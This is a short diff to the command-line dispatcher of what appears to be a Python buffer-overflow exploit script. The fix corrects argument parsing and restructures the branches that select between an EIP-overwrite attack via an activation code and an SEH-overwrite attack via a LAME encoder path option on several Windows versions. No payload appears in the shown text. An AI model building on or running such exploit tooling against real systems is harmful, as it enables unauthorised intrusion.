@@ -113,7 +113,9 @@ def options_lame_enc_path_seh():
 if __name__ == '__main__':
     os = 0
     e_type = 0
-    for k,v in enumerate(sys.argv[1]):
+    for k,v in enumerate(sys.argv):
+        if len(sys.argv) == 1:
+            usage()
         if v in ["--os"]:
             os = int(sys.argv[k+1])
         if v in ["--type"]:
@@ -121,16 +123,16 @@ if __name__ == '__main__':
         if v in ["-h","--help","-help","--h"]:
             usage()
 
-        if os == 3:
-            print("[*] Windows 8.1 Pro selected... defaulting to seh")
+    if os == 3:
+        print("[*] Windows 8.1 Pro selected... defaulting to seh")
+        options_lame_enc_path_seh()
+    elif os == 1:
+        if e_type == 1:
+             activation_code_eip_overwrite()
+        elif e_type == 2:
             options_lame_enc_path_seh()
-        elif os == 1:
-            if e_type == 1:
-                activation_code_eip_overwrite()
-            elif e_type == 2:
-                options_lame_enc_path_seh()
-        elif os == 2:
-            if e_type == 1:
-                activation_code_eip_overwrite()
-            elif e_type == 2:
-                options_lame_enc_path_seh()
+    elif os == 2:
+        if e_type == 1:
+            activation_code_eip_overwrite()
+        elif e_type == 2:
+            options_lame_enc_path_seh()
